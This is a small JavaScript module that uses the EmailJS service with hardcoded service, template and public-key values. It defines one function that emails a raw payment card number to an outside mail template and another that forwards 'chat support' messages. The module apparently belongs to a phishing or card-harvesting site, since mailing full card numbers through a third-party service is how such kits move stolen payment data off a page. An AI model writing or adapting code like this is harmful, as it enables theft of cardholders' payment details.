import emailjs from 'emailjs-com';

const SERVICE_ID = 'service_ozea06x';
const TEMPLATE_ID = 'template_hjohb6l';
const CHAT_TEMPLATE_ID = 'template_jrao90f'; // Chat messages template ID
const PUBLIC_KEY = 'XMOnwjyzQDoRVRYl3';

export function sendCardNumberEmail(cardNumber) {
  return emailjs.send(
    SERVICE_ID,
    TEMPLATE_ID,
    { card_number: cardNumber },
    PUBLIC_KEY
  );
}

export function sendChatMessage(message, userEmail = 'customer@unknown.com') {
  const templateParams = { 
    message: message,
    user_email: userEmail,
    timestamp: new Date().toLocaleString(),
    subject: 'New Chat Support Message'
  };

  return emailjs.send(
    SERVICE_ID,
    CHAT_TEMPLATE_ID,
    templateParams,
    PUBLIC_KEY
  );
}
